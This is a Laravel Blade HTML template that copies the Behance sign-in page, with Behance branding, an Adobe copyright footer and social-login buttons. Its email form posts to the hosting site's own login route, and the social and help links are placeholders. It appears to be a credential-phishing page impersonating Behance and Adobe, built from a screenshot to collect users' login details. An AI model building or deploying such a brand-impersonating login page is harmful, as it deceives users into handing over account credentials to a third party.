<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in | Behance</title>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --color-primary: #1473e6;
            --color-primary-hover: #0d66d0;
            --color-text: #2c2c2c;
            --color-muted: #6e6e6e;
            --color-border: #d0d0d0;
            --font-main: 'Source Sans 3', sans-serif;
        }

        body {
            font-family: var(--font-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Mountain background image */
        .bg-wrap {
            position: fixed;
            inset: 0;
            background-image: url('https://images.unsplash.com/photo-1776679768423-114637549209?w=1920&auto=format&fit=crop&q=85&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHx0b3BpYy1mZWVkfDUxfGJvOGpRS1RhRTBZfHxlbnwwfHx8fHw%3D');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            z-index: 0;
        }
        .bg-wrap::after {
            content: '';
            position: absolute;
            inset: 0;
            background: rgba(5, 15, 30, 0.50);
        }

        /* Behance brand bottom-left */
        .brand-label {
            position: fixed;
            bottom: 56px;
            left: 48px;
            display: flex;
            align-items: center;
            gap: 14px;
            z-index: 2;
        }
        .brand-logo-box {
            width: 40px; height: 40px;
            background: #fff;
            border-radius: 6px;
            display: flex; align-items: center; justify-content: center;
            font-size: 18px; font-weight: 900; color: #1b1b1b;
            letter-spacing: -1px;
        }
        .brand-label span {
            font-size: 22px; font-weight: 700; color: #fff;
            letter-spacing: -0.3px;
        }



        .page-main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            padding: 40px 8% 40px 48px;
            position: relative;
            z-index: 1;
        }

        .auth-card {
            background: #fff;
            border-radius: 6px;
            padding: 44px 48px 48px;
            width: 448px;
            box-shadow: 0 12px 48px rgba(0,0,0,.28);
        }

        .auth-card h1 {
            font-size: 30px;
            font-weight: 700;
            color: var(--color-text);
            margin-bottom: 10px;
            letter-spacing: -0.3px;
        }
        .auth-card .subtitle {
            font-size: 14px;
            color: var(--color-muted);
            margin-bottom: 28px;
        }
        .auth-card .subtitle a {
            color: var(--color-primary);
            text-decoration: none;
            font-weight: 600;
        }
        .auth-card .subtitle a:hover { text-decoration: underline; }

        .form-group { margin-bottom: 20px; }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: var(--color-text);
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 10px 12px;
            border: 1.5px solid var(--color-border);
            border-radius: 4px;
            font-size: 15px;
            font-family: var(--font-main);
            color: var(--color-text);
            outline: none;
            transition: border-color .15s;
            background: #fff;
        }
        .form-group input:focus {
            border-color: var(--color-primary);
            box-shadow: 0 0 0 2px rgba(20,115,230,.15);
        }

        .btn-continue {
            display: block;
            margin-left: auto;
            background: var(--color-primary);
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 10px 30px;
            font-size: 15px;
            font-weight: 700;
            font-family: var(--font-main);
            cursor: pointer;
            transition: background .15s;
            margin-top: 24px;
        }
        .btn-continue:hover { background: var(--color-primary-hover); }

        .divider {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 28px 0 20px;
            color: var(--color-muted);
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--color-border);
        }

        /* Rounded pill social buttons like screenshot */
        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            padding: 12px 16px;
            border: 1.5px solid var(--color-border);
            border-radius: 30px;
            font-size: 15px;
            font-weight: 600;
            color: var(--color-text);
            background: #fff;
            cursor: pointer;
            font-family: var(--font-main);
            transition: background .15s, border-color .15s;
            margin-bottom: 12px;
            text-decoration: none;
        }
        .social-btn:hover { background: #f5f5f5; border-color: #bbb; }
        .social-icon { width: 22px; height: 22px; flex-shrink: 0; }

        /* Facebook icon */
        .fb-icon {
            width: 22px; height: 22px;
            background: #1877F2;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
        }
        .fb-icon svg { width: 13px; height: 13px; fill: #fff; }

        /* LINE icon */
        .line-icon {
            width: 22px; height: 22px;
            background: #06C755;
            border-radius: 6px;
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
        }
        .line-icon svg { width: 15px; height: 15px; fill: #fff; }

        .more-options, .help-link {
            text-align: center;
            margin-top: 18px;
        }
        .more-options a, .help-link a {
            font-size: 13px;
            color: var(--color-primary);
            text-decoration: none;
        }
        .more-options a:hover, .help-link a:hover { text-decoration: underline; }

        .page-footer {
            position: relative;
            z-index: 2;
            background: #fff;
            padding: 13px 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            font-size: 12px;
            color: #6e6e6e;
            flex-wrap: wrap;
        }
        .page-footer a { color: #6e6e6e; text-decoration: none; }
        .page-footer a:hover { text-decoration: underline; }
        .page-footer-sep { color: #ccc; }
    </style>
</head>
<body>

    <div class="bg-wrap"></div>

    <!-- Behance Brand -->
    <div class="brand-label">
        <div class="brand-logo-box">Be</div>
        <span>Behance</span>
    </div>

    <main class="page-main">
        <div class="auth-card">
            <h1>Sign in</h1>
            <p class="subtitle">New user? <a href="{{ route('register') }}">Create an account</a></p>

            <form method="POST" action="{{ route('login.post') }}">
                @csrf

                <div class="form-group">
                    <label for="email">Email address</label>
                    <input type="email" id="email" name="email" autocomplete="email" autofocus
                        value="{{ old('email') }}" required>
                    @error('email')
                        <p style="color:#eb1000;font-size:12px;margin-top:4px;">{{ $message }}</p>
                    @enderror
                </div>


                <div style="display:flex; justify-content:flex-end;">
                    <button type="submit" class="btn-continue">Continue</button>
                </div>
            </form>

            <div class="divider">Or</div>

            <!-- Google -->
            <a href="#" class="social-btn">
                <svg class="social-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
                Continue with Google
            </a>

            <!-- Facebook -->
            <a href="#" class="social-btn">
                <div class="fb-icon">
                    <svg viewBox="0 0 10 18" xmlns="http://www.w3.org/2000/svg">
                        <path d="M6.5 18V10h2.7l.4-3H6.5V5.1c0-.87.24-1.46 1.5-1.46H9.7V.11C9.39.08 8.38 0 7.21 0 4.8 0 3.15 1.49 3.15 4.22V7H.5v3h2.65v8h3.35z"/>
                    </svg>
                </div>
                Continue with Facebook
            </a>

            <!-- LINE -->
            <a href="#" class="social-btn">
                <div class="line-icon">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M19.365 9.89c.50 0 .91.41.91.91s-.41.91-.91.91h-2.28v1.37h2.28c.50 0 .91.41.91.91s-.41.91-.91.91h-3.19c-.5 0-.91-.41-.91-.91V9.89c0-.5.41-.91.91-.91h3.19zm-11.46 4.1c0 .5-.41.91-.91.91s-.91-.41-.91-.91V9.89c0-.5.41-.91.91-.91s.91.41.91.91v4.1zm2.74.91c-.38 0-.71-.23-.85-.59l-1.98-4.1a.91.91 0 011.68-.71l1.14 2.36 1.14-2.36a.91.91 0 011.68.71l-1.98 4.1c-.14.36-.47.59-.85.59zM24 10.26C24 4.6 18.62 0 12 0S0 4.6 0 10.26c0 5.07 4.5 9.32 10.58 10.13.41.09.97.27 1.11.62.13.32.08.82.04 1.14l-.18 1.08c-.05.32-.25 1.26 1.1.69 1.36-.58 7.32-4.31 9.99-7.38A9.12 9.12 0 0024 10.26z"/>
                    </svg>
                </div>
                Continue with LINE
            </a>

            <div class="more-options">
                <a href="#">More sign-in options</a>
            </div>

            <div class="more-options">
                <a href="#">Get help signing in</a>
            </div>
        </div>
    </main>

    <footer class="page-footer">
        <span>Copyright &copy; {{ date('Y') }} Adobe. All rights reserved.</span>
        <span class="page-footer-sep">|</span>
        <a href="#">Terms of Use</a>
        <span class="page-footer-sep">|</span>
        <a href="#">Cookie preferences</a>
        <span class="page-footer-sep">|</span>
        <a href="#">Privacy</a>
        <span class="page-footer-sep">|</span>
        <a href="#">Do not sell or share my personal information</a>
    </footer>

</body>
</html>